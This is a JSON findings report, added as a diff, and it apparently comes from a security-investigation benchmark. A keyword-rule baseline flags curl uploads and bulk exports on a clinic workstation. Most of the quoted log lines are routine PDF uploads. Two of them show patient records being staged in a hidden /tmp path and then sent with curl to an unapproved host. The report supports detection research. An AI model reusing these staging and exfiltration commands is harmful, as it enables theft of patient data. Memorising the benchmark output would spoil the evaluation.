@@ -1,0 +1,585 @@
+{
+ "schema_version": "1.0.0",
+ "report_id": "rep-B0-bndl-ceb8e79cfa1580a8",
+ "bundle_id": "bndl-ceb8e79cfa1580a8",
+ "system_id": "B0",
+ "system_label": "B0 · fixed keyword/regex recipe",
+ "inference_mode": "NO_MODEL_BASELINE",
+ "model_id": null,
+ "findings": [
+  {
+   "id": "B0-01",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T07:47:22Z",
+   "t_end": "2026-11-10T07:48:22Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_afa522601bdd"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-116.pdf http://10.20.8.20/upload/lab-req-116.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-02",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T08:02:14Z",
+   "t_end": "2026-11-10T08:03:14Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_699292ad8f27"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-122.pdf http://10.20.8.20/upload/lab-req-122.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-03",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T08:24:24Z",
+   "t_end": "2026-11-10T08:25:24Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_45a7025b2927"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/sdubois/Documents/lab-req-371.pdf http://10.20.8.20/upload/lab-req-371.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-04",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T09:44:03Z",
+   "t_end": "2026-11-10T09:45:03Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_1e405c221aa3"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/sdubois/Documents/lab-req-640.pdf http://10.20.8.20/upload/lab-req-640.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-05",
+   "claim_type": "data_staging",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T11:09:33Z",
+   "t_end": "2026-11-10T11:10:33Z",
+   "object_or_session": "/tmp/.font-unix/tmp-b77d.dat",
+   "evidence_ids": [
+    "ev_ece9e9f039bf"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:bulk_export"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'bulk_export' matched: clinic-export --dataset patients_full --out /tmp/.font-unix/tmp-b77d.dat",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "verified",
+   "verification_status": "supported_observation",
+   "verifier_notes": [
+    "an object of matching size was written on this host shortly before a non-approved bulk transfer"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-06",
+   "claim_type": "data_staging",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "records",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T11:09:34Z",
+   "t_end": "2026-11-10T11:10:34Z",
+   "object_or_session": "patients_full",
+   "evidence_ids": [
+    "ev_1c9d9beb831d",
+    "ev_afa635d7c9be"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:bulk_export"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'bulk_export' matched: 2026-11-10T11:09:34+00:00 rec-srv-01 records-app[880]: user=sdubois client=10.20.1.21 action=export_bulk dataset=patients_full bytes=22841799 status=200",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record belongs to an object staged on this host ahead of a bulk transfer"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-07",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T11:12:10Z",
+   "t_end": "2026-11-10T11:13:10Z",
+   "object_or_session": "10.20.9.54:8080",
+   "evidence_ids": [
+    "ev_4b85705f6b06"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /tmp/.font-unix/tmp-b77d.dat http://10.20.9.54:8080/u/tmp-b77d.dat",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "verified",
+   "verification_status": "supported_observation",
+   "verifier_notes": [
+    "bulk transfer to a destination not on the approved list, cited via the launching command (flow record corroborates it)"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-08",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T11:50:57Z",
+   "t_end": "2026-11-10T11:51:57Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_79322dfb0b1a"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/sdubois/Documents/lab-req-825.pdf http://10.20.8.20/upload/lab-req-825.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-09",
+   "claim_type": "data_staging",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "records",
+   "actor_claimed": null,
+   "account_used": "svc-backup",
+   "t_start": "2026-11-10T12:05:02Z",
+   "t_end": "2026-11-10T12:06:02Z",
+   "object_or_session": "patients_full",
+   "evidence_ids": [
+    "ev_a270b1a5a52b",
+    "ev_13480b06ac24"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:bulk_export"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'bulk_export' matched: 2026-11-10T12:05:02+00:00 rec-srv-01 records-app[880]: user=svc-backup client=127.0.0.1 action=export_bulk dataset=patients_full bytes=22841799 status=200",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record belongs to an object staged on this host ahead of a bulk transfer"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-10",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T12:17:53Z",
+   "t_end": "2026-11-10T12:18:53Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_f7a2a004e7ca"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-753.pdf http://10.20.8.20/upload/lab-req-753.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-11",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T12:18:10Z",
+   "t_end": "2026-11-10T12:19:10Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_fb36c5ef6c1c"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-280.pdf http://10.20.8.20/upload/lab-req-280.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-12",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T12:34:04Z",
+   "t_end": "2026-11-10T12:35:04Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_4776f7163d69"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/sdubois/Documents/lab-req-507.pdf http://10.20.8.20/upload/lab-req-507.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-13",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T12:53:03Z",
+   "t_end": "2026-11-10T12:54:32Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_a4aba9868cca",
+    "ev_916b1ba72b1c"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-351.pdf http://10.20.8.20/upload/lab-req-351.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-14",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T12:54:19Z",
+   "t_end": "2026-11-10T12:55:19Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_e8bd69935831"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-799.pdf http://10.20.8.20/upload/lab-req-799.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-15",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "rhaddad",
+   "t_start": "2026-11-10T13:26:48Z",
+   "t_end": "2026-11-10T13:27:48Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_a62fdd8c733f"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/rhaddad/Documents/lab-req-629.pdf http://10.20.8.20/upload/lab-req-629.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  },
+  {
+   "id": "B0-16",
+   "claim_type": "policy_violating_transfer",
+   "category": "incident_allegation",
+   "attack_id": null,
+   "technique_family": null,
+   "host": "workstation",
+   "actor_claimed": null,
+   "account_used": "sdubois",
+   "t_start": "2026-11-10T14:35:05Z",
+   "t_end": "2026-11-10T14:36:05Z",
+   "object_or_session": "10.20.8.20:80",
+   "evidence_ids": [
+    "ev_f2fe09778a5e"
+   ],
+   "counterevidence_ids": [],
+   "check_refs": [
+    "b0:upload_tool"
+   ],
+   "confidence": 0.5,
+   "rationale": "keyword rule 'upload_tool' matched: curl -s -T /home/sdubois/Documents/lab-req-153.pdf http://10.20.8.20/upload/lab-req-153.pdf",
+   "assumptions": [
+    "a keyword match is treated as suspicious without cross-checking other sources"
+   ],
+   "alternative_explanations": [],
+   "status": "proposed",
+   "verification_status": "unresolved_interpretation",
+   "verifier_notes": [
+    "no cited record is a bulk transfer observed at the tap from this host, or the command that launched one"
+   ],
+   "skeptic_note": null,
+   "produced_by": "B0"
+  }
+ ],
+ "attribution": {
+  "account_used": null,
+  "session_ref": null,
+  "human_identity": "not_assessed",
+  "named_person_accused": null,
+  "named_person_exonerated": null,
+  "supporting_evidence_ids": [],
+  "contrary_evidence_ids": [],
+  "assumptions": [],
+  "limits": [],
+  "statement": "B0 is a keyword recipe. It reports the account only when every upload-tool match belongs to one account, and it does not assess who operated an account.",
+  "review_status": "skipped_for_benchmark",
+  "approved_by_human": false,
+  "approved_at": null
+ },
+ "summary": "16 keyword match group(s).",
+ "open_questions": [],
+ "usage": {
+  "llm_calls": 0,
+  "tokens_in": 0,
+  "tokens_out": 0,
+  "tokens_cache_read": 0,
+  "cost_estimate_usd": 0.0,
+  "wall_seconds": 0.017402,
+  "tool_calls": 0,
+  "scripted_turns": 0,
+  "retries": 0,
+  "errors": 0,
+  "timed_out": false
+ },
+ "created_at": "2026-11-14T06:17:26.099500Z",
+ "locked": true,
+ "locked_at": "2026-11-14T06:17:26.119784Z",
+ "report_sha256": "540c9f78b32a3e461efea55175e0a27aae5cd2cd310642856ed2589f797dddef",
+ "review_history": [
+  {
+   "at": "2026-11-14T06:17:26.119784Z",
+   "decision": "skipped_for_benchmark",
+   "by_human": false,
+   "note": ""
+  }
+ ],
+ "verifier_version": "1.0.0"
+}
